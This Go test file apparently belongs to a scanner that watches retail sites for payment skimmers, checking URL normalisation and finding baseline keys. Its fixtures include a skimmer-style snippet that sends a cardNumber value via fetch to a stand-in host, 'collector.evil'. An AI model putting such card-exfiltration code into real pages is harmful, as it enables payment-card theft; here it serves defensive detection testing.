package model

import "testing"

func TestStableURLs(t *testing.T) {
	// Pairs of locations from consecutive nightly scans that must count as the same script.
	same := [][2]string{
		{"runtime-loaded https://script.hotjar.com/modules.e85a87e594b0aace33cf.js",
			"runtime-loaded https://script.hotjar.com/modules.47ae0ae40a423a71e31f.js"},
		{"runtime-loaded https://securepubads.g.doubleclick.net/pagead/managed/js/gpt/m202610270101/pubads_impl.js?cb=122881924",
			"runtime-loaded https://securepubads.g.doubleclick.net/pagead/managed/js/gpt/m202611030101/pubads_impl.js?cb=122882097"},
		{"runtime-loaded https://www.googletagmanager.com/gtag/js?id=AW-10996412706&cx=c&gtm=4e6as1",
			"runtime-loaded https://www.googletagmanager.com/gtag/js?gtm=4e6b31&cx=c&id=AW-10996412706"},
		{"runtime-loaded https://www.gstatic.com/recaptcha/releases/bSuJ2xBC8cFy7pM4Z3Hu9boH/recaptcha__es_419.js",
			"runtime-loaded https://www.gstatic.com/recaptcha/releases/bSuJ2xBC8cHT21-c68JXN31m/recaptcha__es_419.js"},
		{"runtime-loaded https://analytics.tiktok.com/i18n/pixel/static/main.MTJjYzk1MmQ1MA.js",
			"runtime-loaded https://analytics.tiktok.com/i18n/pixel/static/main.MTJjYzk1MmQ1MQ.js"},
		// VTEX bundles: the hash is in the path and the query lists app versions that change.
		{"https://carrefourar.vtexassets.com/_v/public/assets/v1/published/bundle/public/react/asset-812f25fd62d9a4f5e450362d86bea4dc7c7bcc39.min.js?v=1&files=vtex.render-runtime@8.136.3,ExtensionContainer&files=vtex.google-tag-manager@3.5.4,index&workspace=master",
			"https://carrefourar.vtexassets.com/_v/public/assets/v1/published/bundle/public/react/asset-c970a09bee1bc34e6a6f00aa11bb22cc33dd44ee.min.js?v=1&files=vtex.render-runtime@8.136.4,ExtensionContainer&files=valtech.new-app@0.0.1,index&workspace=master"},
		// Google tag gateway: signed per-load paths with few digits.
		{"runtime-loaded https://www.falabella.com/google-tag-gateway/_NZEoet-XZe_QEgiUwInakkqBh1zuCmrFxji0PvdN7DMOBJShg",
			"runtime-loaded https://www.falabella.com/google-tag-gateway/_NZEoet-XZe_QEgiUwInakkqBhAbCdEfGhIjKlMnOpQrStUvW"},
	}
	for _, p := range same {
		if a, b := StableURLs(p[0]), StableURLs(p[1]); a != b {
			t.Errorf("should match:\n  %s\n  %s", a, b)
		}
	}

	// Different scripts must stay different.
	different := [][2]string{
		{"https://cdn.example.com/checkout.js", "https://cdn.example.com/payment.js"},
		{"https://www.googletagmanager.com/gtm.js?id=GTM-TMWBWNM", "https://www.googletagmanager.com/gtm.js?id=GTM-53LM5RF"},
		{"https://shop.example/a.js", "https://evil.example/a.js"},
	}
	for _, p := range different {
		if StableURLs(p[0]) == StableURLs(p[1]) {
			t.Errorf("should differ: %s vs %s", p[0], p[1])
		}
	}
}

func TestBaselineKeyIgnoresEvidence(t *testing.T) {
	a := Finding{Layer: LayerStatic, Rule: "skimmer-pattern", Target: "vea", Location: "https://x.example/a.js", Evidence: "one"}
	b := a
	b.Evidence = "two"
	if a.BaselineKey() != b.BaselineKey() {
		t.Error("evidence should not affect the baseline key")
	}
	if a.Fingerprint() == b.Fingerprint() {
		t.Error("evidence should still distinguish findings for deduplication")
	}
}

// Next.js renames its chunks on every deploy and loads a different subset on each visit.
func TestBaselineKeyBuildChunks(t *testing.T) {
	a := Finding{Layer: LayerStatic, Rule: "skimmer-pattern", Target: "americanas",
		Location: "runtime-loaded https://d3j4fp6tj8iflg.cloudfront.net/_next/static/immutable/chunks/1lz2_6gjxhtvz.js",
		Evidence: `function(e,t){var n=e.cardNumber; fetch("https://api.example/p",{body:n})`}
	renamed := a
	renamed.Location = "https://d3j4fp6tj8iflg.cloudfront.net/_next/static/immutable/chunks/0ws-kgcydtg_d.js"
	renamed.Evidence = `function(r,o){var i=r.cardNumber; fetch("https://api.example/p",{body:i})`
	if a.BaselineKey() != renamed.BaselineKey() {
		t.Error("the same code in a renamed chunk should keep its key")
	}
	changed := a
	changed.Evidence = `function(e,t){var n=e.cardNumber; fetch("https://collector.evil/p",{body:n})`
	if a.BaselineKey() == changed.BaselineKey() {
		t.Error("new code in a chunk must get a new key")
	}
	if _, ok := BuildChunkDir("https://www.googletagmanager.com/gtm.js?id=GTM-X"); ok {
		t.Error("only bundler chunk paths are collapsed")
	}
}
